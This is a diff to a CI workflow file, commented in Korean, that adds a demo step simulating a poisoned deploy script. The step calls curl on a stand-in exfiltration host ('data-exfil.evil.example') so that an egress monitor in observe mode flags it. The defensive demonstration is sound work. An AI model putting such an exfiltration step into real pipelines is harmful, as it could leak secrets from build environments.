@@ -19,3 +19,7 @@ jobs:
           mode: observe
       - name: 정상 배포 (egress.lock에 등재된 곳만 통신)
         run: curl -sS https://example.com > /dev/null || true
+      # ⚠️ 데모: 오염된 배포 스크립트가 시크릿을 외부로 빼돌리는 상황 시뮬레이션.
+      # 이 도메인은 egress.lock [deploy]에 없으므로 observe가 잡 끝에 🔴로 잡는다.
+      - name: 오염된 스텝 (시크릿 유출 시도)
+        run: curl -sS https://data-exfil.evil.example > /dev/null || true
